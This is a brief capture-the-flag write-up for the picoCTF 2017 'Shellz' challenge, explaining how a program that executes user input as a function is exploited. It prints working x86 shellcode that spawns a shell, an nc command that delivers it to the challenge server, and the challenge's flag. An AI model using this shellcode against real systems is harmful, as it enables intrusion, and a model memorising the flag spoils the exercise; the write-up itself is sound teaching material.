# **Shellz - 55 pts**

```
You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:6942.
```

So we're given a port to connect to and some source code. Let's see what we can do.

### **Step 1 - where is the weakness in shellz.c?**
`void (*func)() = (void (*)())stuff;`

When we input our 40 bytes into the program, a function pointer is created! This means we can manipulate the program to execute code it wasn't intended for.

### **Step 2 - generate payload**
For this, we need shellcode. Lots of people before you have written their own, so don't bother trying to write your own. [here](https://www.google.com/search?q=shellcode+generator&oq=shellcode+generator&aqs=chrome..69i57j0l5.2937j0j4&sourceid=chrome&ie=UTF-8)

`python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')" > payload`

is what I utilized, which executes /bin/dash. Next, to run it through the program.

### **Step 3 - put it together**
`cat payload - | nc shell2017.picoctf.com 6942`

The `-` is necessary so that the contents of payload count as stdin to nc. Once you have executed that, you should have a shell! Look to find the flag, flag.txt, and cat it.


flag{4effa67d6909029fd3cc45600f024e3f}
